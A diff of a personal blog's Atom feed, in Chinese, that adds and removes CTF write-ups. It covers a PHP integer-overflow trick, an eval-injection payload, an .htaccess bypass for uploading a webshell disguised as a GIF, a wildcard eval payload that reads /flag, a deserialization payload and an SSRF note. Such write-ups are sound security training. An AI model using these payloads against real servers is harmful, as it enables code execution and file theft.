@@ -6,17 +6,44 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-10-29T15:30:59.223Z</updated>
+  <updated>2021-11-07T07:58:05.505Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hackergame2021</title>
+    <link href="http://lll-nnn.github.io/2021/11/07/hackergame2021/"/>
+    <id>http://lll-nnn.github.io/2021/11/07/hackergame2021/</id>
+    <published>2021-11-07T07:12:15.000Z</published>
+    <updated>2021-11-07T07:58:05.505Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png"></p><p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p><p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p><p>也可以用二分法</p><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 16349792471634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png"><br>显然，69是组合不出20的</p><p>需要猜测源码，<code>intval</code></p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    check_last_action();    $bottle_6 = intval($_POST[<span class="hljs-string">&#x27;b6&#x27;</span>]);    $bottle_9 = intval($_POST[<span class="hljs-string">&#x27;b9&#x27;</span>]);    <span class="hljs-keyword">if</span> ($bottle_6 &lt; <span class="hljs-number">0</span> || $bottle_9 &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;操作无效：不能放负数个瓜。点击&lt;a href=&quot;/&quot;&gt;这里&lt;/a&gt;回到主页。&#x27;</span>);    &#125;    $_SESSION[<span class="hljs-string">&#x27;pool&#x27;</span>] += intval($bottle_6 * <span class="hljs-number">6</span> + $bottle_9 * <span class="hljs-number">9</span>);    header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);&#125;</code></pre><p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> PHP_INT_MAX;   <span class="hljs-comment">//9223372036854775807</span>$a=<span class="hljs-number">9223372036854775807</span>;$b=<span class="hljs-number">9223372036854775808</span>;$ia=intval($a);$ib=intval($b);var_dump($a);   <span class="hljs-comment">//int(9223372036854775807)</span>var_dump($b);   <span class="hljs-comment">//float(9.2233720368548E+18)</span>var_dump($ia);  <span class="hljs-comment">// int(9223372036854775807)</span>var_dump($ib);  <span class="hljs-comment">//int(-9223372036854775808)</span></code></pre><pre><code>1024819115206086200 * 9 = 92233720368547758001024819115206086201 * 9 = 9223372036854775809</code></pre><pre><code class="hljs php">$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib = intval($b); <span class="hljs-comment">// int(-9223372036854775808)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-8)</span>$b = <span class="hljs-number">1</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(1)</span>$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-9223372036854775807)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-7)</span>$b = <span class="hljs-number">3</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(20)</span></code></pre><p>操作六次</p><pre><code>1024819115206086201 * 91024819115206086200 * 91 * 91024819115206086201 * 91024819115206086200 * 93 * 9</code></pre><p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png&quot;&gt;&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+  </entry>
   
   <entry>
     <title>DAS X 吉林工师</title>
     <link href="http://lll-nnn.github.io/2021/10/29/DAS/"/>
     <id>http://lll-nnn.github.io/2021/10/29/DAS/</id>
     <published>2021-10-29T15:25:09.000Z</published>
-    <updated>2021-10-29T15:30:59.223Z</updated>
+    <updated>2021-11-07T07:57:11.927Z</updated>
     
     <content type="html"><![CDATA[<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);extract($_GET);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);    <span class="hljs-keyword">return</span> $array;&#125;<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123;        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;        $attrids = count($attrid);        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)        &#123;            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)            &#123;                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;            &#125;        &#125;        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;&#125;String2Array($attrstr);</code></pre><p>突破点在<code>attrvalue</code>上</p><p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flag在<code>phpinfo()</code>中</p><p>通过闭合双引号让<code>eval</code>执行命令</p>]]></content>
     
@@ -30,14 +57,14 @@
     
     <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
     
-    <category term="sqli" scheme="http://lll-nnn.github.io/categories/CTF/sqli/"/>
+    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
     
     
     <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
     
     <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
     
-    <category term="sqli" scheme="http://lll-nnn.github.io/tags/sqli/"/>
+    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
     
   </entry>
   
@@ -591,37 +618,6 @@
     <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
     
     <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Wicctf</title>
-    <link href="http://lll-nnn.github.io/2021/05/11/wicctf/"/>
-    <id>http://lll-nnn.github.io/2021/05/11/wicctf/</id>
-    <published>2021-05-11T09:00:11.000Z</published>
-    <updated>2021-05-13T15:35:36.167Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p><p>这时候就应该找apache中的相关配置了    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p><p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p><p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>过滤了字母数字还有<code>_@$</code>    </p><p>试了下异或，不行；url取反也不行，就没招了…….      </p><p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>停电了会发生什么    </p><p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p><p>扫到<code>.index.php.swp</code>       </p><p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  、 flag在<code>/flag</code>      </p><p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p><p>flag过滤了，双写即可绕过    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p><p>算了，环境也关了，附上<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p><p>还有一道GO语言的题…….完全不懂…..</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;UploadHub&quot;&gt;&lt;a href=&quot;#UploadHub&quot; class=&quot;headerlink&quot; title=&quot;UploadHub&quot;&gt;&lt;/a&gt;UploadHub&lt;/h2&gt;&lt;p&gt;文件上传题&lt;br&gt;给了源码，其中有些配置文件看不懂，放弃了   &lt;/p&gt;
-&lt;p&gt;&lt;i</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
-    
-    <category term="wicctf" scheme="http://lll-nnn.github.io/categories/CTF/wicctf/"/>
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
-    
-    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
-    
-    <category term="wicctf" scheme="http://lll-nnn.github.io/tags/wicctf/"/>
     
   </entry>
   
